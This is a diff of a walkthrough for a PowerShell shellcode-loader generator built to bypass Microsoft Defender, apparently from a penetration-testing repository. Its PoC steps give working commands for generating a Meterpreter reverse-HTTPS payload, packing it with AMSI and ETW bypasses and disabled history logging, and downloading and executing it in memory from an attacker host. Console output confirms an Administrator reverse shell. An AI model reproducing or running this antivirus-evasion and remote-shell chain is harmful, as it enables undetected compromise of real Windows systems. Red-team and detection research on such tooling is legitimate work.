@@ -1,8 +1,8 @@
-================================================================================================================================================
-AV bypass using my PowerShell Shellcode loader 'Invoke-PoSH-ShellCodeLoader.ps1' (v2.0)
-================================================================================================================================================
+====================================================================================================================================================================
+AV bypass using my PowerShell Shellcode loader 'Invoke-PoSH-ShellCodeLoader.ps1'
+====================================================================================================================================================================
 
-'Invoke-PoSH-ShellCodeLoader' is a shellcode loader script generator that aims to bypass AV solutions such as Windows Defender.
+'Invoke-PoSH-ShellCodeLoader' is a shellcode loader script generator that aims to bypass AV solutions such as Microsoft Defender.
 It generates an obfuscated and encrypted shellcode loader PowerShell script that will inject the shellcode into the current process's virtual address space.
 
 => URL: https://github.com/Jean-Francois-C/Windows-Penetration-Testing/tree/master/Defense%20evasion%20(examples)/Invoke-PoSH-ShellCodeLoader
@@ -20,42 +20,39 @@ FEATURES
 > Compatible with shellcodes from multiple C2 frameworks (Metasploit, Silver and Havoc)
 
 
-=====================================================================================================================================================
-PoC 1 - Example with a (x64) Meterpreter reverse HTTPS shell running on a Windows 10 laptop fully patched with Windows Defender enabled & up-to-date
-=====================================================================================================================================================
+====================================================================================================================================================================
+PoC 1 - Example with a (x64) Meterpreter reverse HTTPS shell running on a Windows server 2022 fully patched with Microsoft Defender AV enabled & up-to-date
+====================================================================================================================================================================
 
----------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------
 Step 1 - Generate a stageless (x64) Meterpreter reverse HTTPS shellcode in RAW format
----------------------------------------------------------------------------------------------
+----------------------------------------------------------------------------------------------------------
 
-jeff@kali:~/Documents/Tools/Pivoting-with-MSF/test$ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem LHOST=192.168.56.104 LPORT=443 -a x64 -f raw -o shellcodeMSFstagelessHTTPS 
+jeff@kali:~/Documents/Tools$ msfvenom -p windows/x64/meterpreter_reverse_https EXITFUNC=thread HandlerSSLCert=/home/jeff/Documents/Tools/pentest.pem LHOST=192.168.1.30 LPORT=443 -a x64 -f raw -o shellcodeMSFstagelessHTTPS 
 [-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
 No encoder specified, outputting raw payload
 Payload size: 201308 bytes
 Saved as: shellcodeMSFstagelessHTTPS
 
-jeff@kali:~/Documents/Tools/Pivoting-with-MSF/test$ python3 -m http.server 8080
+jeff@kali:~/Documents/Tools$ python3 -m http.server 8080
 Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
 
 
-----------------------------------------------------------------------------------------------------------
-Step 2 - Create an obfuscated & encrypted shellcode loader script using 'Invoke-PoSH-ShellCodeLoader.ps1'
-----------------------------------------------------------------------------------------------------------
+-------------------------------------------------------------------------------------------------------------------------------------
+Step 2 - Create an obfuscated & encrypted shellcode loader script using 'Invoke-PoSH-ShellCodeLoader.ps1' on your pentest machine
+-------------------------------------------------------------------------------------------------------------------------------------
 
-PS C:\temp> wget -URI http://192.168.56.104:8080/shellcodeMSFstagelessHTTPS -Outfile C:\temp\shellcodeMSFstagelessHTTPS
-
-
-PS C:\temp> . .\Invoke-PoSH-ShellCodeLoader.ps1
+PS C:\temp> IEX (New-Object Net.WebClient).DownloadString('https://github.com/Jean-Francois-C/Windows-Penetration-Testing/raw/master/Defense%20evasion%20(examples)/Invoke-PoSH-ShellCodeLoader/Invoke-PoSH-ShellCodeLoader.ps1');
 
   ___     ___ _  _     ___ _        _ _  ___         _     _                _
  | _ \___/ __| || |___/ __| |_  ___| | |/ __|___  __| |___| |   ___  __  __| |___ ___
  |  _/ _ \__ \ __ |___\__ \ ' \/ -_) | | (__/ _ \/ _  / -_| |__/ _ \/ _|/ _  / -_)  _|
  |_| \___/___/_||_|   |___/_||_\___|_|_|\___\___/\__,_\___|____\___/\__,\__,_\___|_|
-                                                                                     v2.0
+                                                                                     v2.2
 Usage:
 > Import-Module ./Invoke-PoSH-ShellCodeLoader.ps1
-> Invoke-PoSH-ShellCodeLoader -Type MSF/Sliver/Havoc -FileUrl https://URL/shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1
-> Invoke-PoSH-ShellCodeLoader -Type MSF/Sliver/Havoc -FilePath C:\path\shellCode -OutFile C:\path\Packed-ShellCodeLoader.ps1
+> Invoke-PoSH-ShellCodeLoader -Type MSF/Sliver/Havoc -FileUrl https://URL/shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1
+> Invoke-PoSH-ShellCodeLoader -Type MSF/Sliver/Havoc -FilePath C:\path\shellcode -OutFile C:\path\Packed-ShellCodeLoader.ps1
 
 Features:
 [*] Shellcode injection into the memory of the current process
@@ -66,64 +63,76 @@ Features:
 [*] Basic sandbox evasion techniques (optional -sandbox)
 
 
-PS C:\temp> Invoke-PoSH-ShellCodeLoader -Type MSF -FilePath C:\temp\shellcodeMSFstagelessHTTPS -OutFile C:\temp\packed-MSFstagelessHTTPS.ps1
-[*] Loading the Meterpreter shellcode: 'C:\temp\shellcodeMSFstagelessHTTPS
-[*] Creating the shellcode loader script
+PS C:\temp> Invoke-PoSH-ShellCodeLoader -Type MSF -FileUrl http://192.168.1.30:8080/shellcodeMSFstagelessHTTPS -OutFile C:\temp\packed-MSFstagelessHTTPS.ps1
+[*] Downloading the Meterpreter shellcode: 'http://192.168.1.30:8080/shellcodeMSFstagelessHTTPS'
+[*] Creating the shellCode loader script
 [*] File compression (GZip/Deflate)
 [*] File encryption (AES)
 [*] Adding 'A'M'S'I' bypass
 [*] Adding 'E'T'W' bypass
 [*] Disabling PoSh history logging
-[*] The obfuscated & encrypted Meterpreter shellcode loader script has been saved: 'packed-MSFstagelessHTTPS.ps1' ...
+[*] The obfuscated & encrypted Meterpreter shellcode loader script has been saved: 'C:\temp\packed-MSFstagelessHTTPS.ps1' ...
 [+] Done!
 
 PS C:\temp>
 
 
 ------------------------------------------------------------------------------------------------------------------------------------------
-Step 3 - Download & execute into memory the encrypted shellcode loader script 'packed-MSFstagelessHTTPS.ps1' without being detected 
-         by Windows Defender on a Windows 10 laptop fully patched (with MS Defender AV enabled and up-to-date)
+Step 3 - Download & execute in-memory the encrypted shellcode loader script 'packed-MSFstagelessHTTPS.ps1' on a target Windows server 2022  
+         without being detected by the Microsoft Defender AV  
 ------------------------------------------------------------------------------------------------------------------------------------------
 
-PS C:\> systeminfo
+Microsoft Windows [Version 10.0.20348.3692]
+(c) Microsoft Corporation. All rights reserved.
 
-Host Name:                 Laptop1
-OS Name:                   Microsoft Windows 10 Pro
-OS Version:                10.0.19044 N/A Build 19044
+C:\Users\Administrator> cd C:\temp   
+
+C:\temp> systeminfo
+
+Host Name:                 SERVER-WIN2022
+OS Name:                   Microsoft Windows Server 2022 Standard Evaluation
+OS Version:                10.0.20348 N/A Build 20348
 OS Manufacturer:           Microsoft Corporation
-OS Configuration:          Member Workstation
-OS Build Type:             Multiprocessor Free
 <SNIP>
 
+C:\temp> powershell
 
-PS C:\> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled,AntivirusSignatureLastUpdated | FL
+Windows PowerShell
+Copyright (C) Microsoft Corporation. All rights reserved.
+Install the latest PowerShell for new features and improvements! https://aka.ms/PSWindows
+
+PS C:\temp> Get-MpComputerStatus | Select AntivirusEnabled,RealTimeProtectionEnabled,IoavProtectionEnabled,AntispywareEnabled, AntivirusSIgnatureLastUpdated|FL
 
 AntivirusEnabled              : True
 RealTimeProtectionEnabled     : True
 IoavProtectionEnabled         : True
 AntispywareEnabled            : True
-AntivirusSignatureLastUpdated : 06/02/2023 06:13:32
+AntivirusSIgnatureLastUpdated : 8/1/2025 6:06:24 AM
 
 
-PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.113:8081/packed-MSFstagelessHTTPS.ps1');
+PS C:\> IEX (New-Object Net.WebClient).DownloadString('http://192.168.1.144:8080/packed-MSFstagelessHTTPS.ps1');
 
 
 ------------------------------------------------------------
 Step 4 - You have now a Meterpreter reverse shell running 
 ------------------------------------------------------------
 
-jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.56.104; set LPORT 443;
- set EXITFUNC thread; set ExitOnSession false; set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem; 
- set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; run -j"
+jeff@kali:~$ sudo msfconsole -x "use exploit/multi/handler; set PAYLOAD windows/x64/meterpreter_reverse_https; set LHOST 192.168.1.30; set LPORT 443; set EXITFUNC thread; set ExitOnSession false; 
+            set HandlerSSLCert /home/jeff/Documents/Tools/Pivoting-with-MSF/pentest.pem; set SessionCommunicationTimeout 0; set EnableUnicodeEncoding true; run -j"
+
+# cowsay++
+ ____________
+< metasploit >
+ ------------
+       \   ,__,
+        \  (oo)____
+           (__)    )\
+              ||--|| *
 
        =[ metasploit v6.1.14-dev                          ]
 + -- --=[ 2180 exploits - 1155 auxiliary - 399 post       ]
 + -- --=[ 596 payloads - 46 encoders - 10 nops            ]
-+ -- --=[ 9 evasion                                       ]
-
-Metasploit tip: Search can apply complex filters such as 
-search cve:2009 type:exploit, see all the filters 
-with help search
++ -- --=[ 9 evasion      
 
 [*] Starting persistent handler(s)...
 [*] Using configured payload generic/shell_reverse_tcp
@@ -138,29 +147,49 @@ EnableUnicodeEncoding => true
 [*] Exploit running as background job 0.
 [*] Exploit completed, but no session was created.
 
-[*] Started HTTPS reverse handler on https://192.168.56.104:443
+msf6 exploit(multi/handler) >
+[*] Started HTTPS reverse handler on https://192.168.1.30:443
+[*] https://192.168.1.30:443 handling request from 192.168.1.11; (UUID: avrxenms) Redirecting stageless connection from /nlAoPap1RSbx7PDumWG9Tw-GqBVveJPIJhz8PIFHMmDCAcp98KRLQTWrEMn
+3qLhxbBvZV1czVeWZ84U5HW-1jPgqXGBGPKWsLWJg6usop2gyqp-WqEo312qkgtCQlD1 with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
+[*] https://192.168.1.30:443 handling request from 192.168.1.11; (UUID: avrxenms) Attaching orphaned/stageless session...
 
-msf6 exploit(multi/handler) > 
+[*] Meterpreter session 1 opened (192.168.1.30:443 -> 127.0.0.1 ) at 2025-08-02 01:24:19 +0200
 
-msf6 exploit(multi/handler) > 
-[*] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: mrffnfac) Redirecting stageless connection from /kuTFiI0jDUAhxCDGQiWuPQBKqH4s with UA 'Mozilla/5.0 (Windows NT 6.1; Trident/7.0; rv:11.0) like Gecko'
-[*] https://192.168.56.104:443 handling request from 192.168.56.1; (UUID: mrffnfac) Attaching orphaned/stageless session...
-[*] Meterpreter session 1 opened (192.168.56.104:443 -> 127.0.0.1 ) at 2023-02-07 00:40:42 +0100
+msf6 exploit(multi/handler) >
+
+msf6 exploit(multi/handler) > sessions -i
+
+Active sessions
+===============
+
+  Id  Name  Type                     Information                                    Connection
+  --  ----  ----                     -----------                                    ----------
+  1         meterpreter x64/windows  SERVER-WIN2022\Administrator @ SERVER-WIN2022  192.168.1.30:443 -> 127.0.0.1  (192.168.1.11)
 
 msf6 exploit(multi/handler) > sessions -i 1
 [*] Starting interaction with 1...
 
 meterpreter > getuid
-Server username: Laptop1\Administrator
+Server username: SERVER-WIN2022\Administrator
+
+meterpreter > sysinfo
+Computer        : SERVER-WIN2022
+OS              : Windows 2016+ (10.0 Build 20348).
+Architecture    : x64
+System Language : en_US
+Domain          : WORKGROUP
+Logged On Users : 1
+Meterpreter     : x64/windows
 
 meterpreter > exit
 [*] Shutting down Meterpreter...
 
+[*] 192.168.1.11 - Meterpreter session 1 closed.  Reason: User exit
 
 
-=====================================================================================================================================================
-PoC 2 - Example with a (x64) SLIVER reverse HTTPS shell running on a Windows 10 laptop fully patched with Windows Defender enabled & up-to-date
-=====================================================================================================================================================
+====================================================================================================================================================================
+PoC 2 - Example with a (x64) SLIVER reverse HTTPS shell running on a Windows 10 laptop fully patched with Microsoft Defender enabled & up-to-date
+====================================================================================================================================================================
 
 ----------------------------------------------------------
 Step 1 - Generate a SLIVER shellcode (stageless & session)
@@ -319,9 +348,9 @@ Logon ID: Laptop1\Administrator
 
 
 
-=====================================================================================================================================================
-PoC 3 - Example with a (x64) HAVOC reverse HTTPS shell running on a Windows 10 laptop fully patched with Windows Defender enabled & up-to-date
-=====================================================================================================================================================
+====================================================================================================================================================================
+PoC 3 - Example with a (x64) HAVOC reverse HTTPS shell running on a Windows 10 laptop fully patched with Microsoft Defender enabled & up-to-date
+====================================================================================================================================================================
 
 -----------------------------------------------
 Step 1 - Start the HAVOC teamserver and client 
